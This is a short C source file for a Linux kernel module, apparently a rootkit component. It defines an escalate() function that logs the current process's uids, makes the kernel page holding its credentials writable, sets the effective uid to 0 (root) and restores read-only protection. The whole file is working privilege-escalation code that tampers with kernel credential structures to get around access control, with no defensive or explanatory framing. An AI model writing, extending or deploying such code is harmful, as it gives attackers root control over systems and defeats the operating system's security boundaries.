#include <linux/module.h>    /* Needed by all modules */
#include <linux/kernel.h>    /* Needed for KERN_INFO */
#include <linux/sched.h>
#include <linux/cred.h>

//#include "/usr/src/linux/include/linux/sched.h"


#include "privilege_escalation.h"
#include "global.h"


void escalate(void){
    struct cred *my_cred;
    OUR_DEBUG("task: %s\n", current->comm);
    OUR_DEBUG("uid: %d\n", current->cred->uid);
    OUR_DEBUG("suid: %d\n", current->cred->suid);
    OUR_DEBUG("euid: %d\n", current->cred->euid);

    my_cred = (struct cred *) current->cred; //cast away constness
    make_page_writable((long unsigned int) &(my_cred->euid));
    my_cred->euid = 0;
    make_page_readonly((long unsigned int) &(my_cred->euid));
}
